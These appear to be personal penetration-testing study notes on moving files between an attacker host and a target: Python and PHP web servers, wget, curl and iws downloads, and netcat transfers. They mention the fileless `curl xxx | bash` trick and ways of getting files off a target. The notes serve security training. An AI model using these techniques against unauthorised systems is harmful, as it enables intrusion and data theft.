# Transfer files 🛅

[![filetransfers](../../../_badges/htb/filetransfers.svg)](https://academy.hackthebox.com/course/preview/file-transfers)

<div class="row row-cols-lg-2"><div>

We will often want to transfer files between your machine, and the target. Mostly during privilege escalation and post-exploitation.

According to the current environment capabilities <small>(e.g., installed tools)</small> and restrictions <small>(e.g. firewall)</small>, we will have to use different techniques.

The most common approaches from the host to the target:

* Copy-pasting <small>(short text files)</small> ✂️
* Python web server <small>(using wget/cURL/iwr as client)</small> 🐍

📚 There are also fileless techniques to avoid storing the file on the target, such as `curl xxx | bash` or other similar tricks.
</div><div>

To transfer a file from the target to the host, it's often harder and more complex. Some common approaches are:

* Copy-pasting <small>(short text files)</small> ✂️
* Moving files to the webserver directory <small>(if applicable)</small> 📂
* Python web server <small>(often available on Linux)</small> 🐍
* Using services such as SCP/FTP/SMB/NFS/... <small>(if present)</small> 🎡
* Using installed tools such as nc, php, etc. 🧯

We may use checksum functions/commands to check that the file was correctly transferred. [Refer to cryptography/hashing/checksum](/cybersecurity/cryptography/algorithms/hashing/index.md#file-checksum).
</div></div>

<hr class="sep-both">

## Exposing a file to others 🔒

<i class="small">On the "host" where the file is:</i>

<div class="row row-cols-lg-2"><div>

#### Python webserver 🐍

You may try with `python2`, and `python3` if `python` is unavailable.

```shell!
$ python -m http.server port # port > 1023 | expose pwd
$ python [...] --directory /path/to/server/root
$ sudo python -m http.server port # port <= 1023
```
</div><div>

#### Other webservers 🎡

You may leverage an installed web development tool/package:

```shell!
$ php -S 127.0.0.1:8080 # php
$ http-server -p 8080   # node "http-server" package
```
</div></div>

<hr class="sep-both">

## Downloading an exposed file 🔑

<i class="small">On the "client" that need the file:</i>

<div class="row row-cols-lg-2"><div>

#### Using Common Utilities

The `wget` command is available on both Linux and Windows.

```shell!
$ # Download on Linux
$ wget HOST_IP:port/script.sh -o /tmp/script.sh
PS> # Download on Windows
PS> wget HOST_IP:port/script.ps1 -o $Env:TMP/script.ps1
```

You may have to use `curl` or `iws` (Windows-only) instead of `wget`.

```shell!
$ curl HOST_IP:port/script.sh -o /tmp/script.sh
PS> curl HOST_IP:port/script.ps1 -o $Env:TMP/script.ps1
PS> iws HOST_IP:port/script.ps1 -o $Env:TMP/script.ps1
```
</div><div>

**To-do** 👻

* `copy`/`robocopy ` command to upload/download (SMB?) files
</div></div>

<hr class="sep-both">

## Other methods

<div class="row row-cols-lg-2"><div>

#### services 🕳️

You may use FTP/SCP/NFS/SMB/... if applicable. You can easily create a SMB server on your machine using [impacket](/operating-systems/networking/protocols/tools/impacket.md) scripts.
</div><div>

#### netcat 🐈

```ps
# host
$ nc CLIENT_IP port < file.sh
# client
$ nc -lvp port > file.sh
```

<br>

#### Copy-paste ✂️

Copy-paste may be an option, but not every file can be copy-pasted. One trick is to encode the file using base64, copy-paste the base64 payload on a file on the target, and decode the file on the target.
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* [Windows File Transfer Cheatsheet](https://infinitelogins.com/2020/09/04/windows-file-transfer-cheatsheet/)
* [croc](https://github.com/schollz/croc)
</div><div>
</div></div>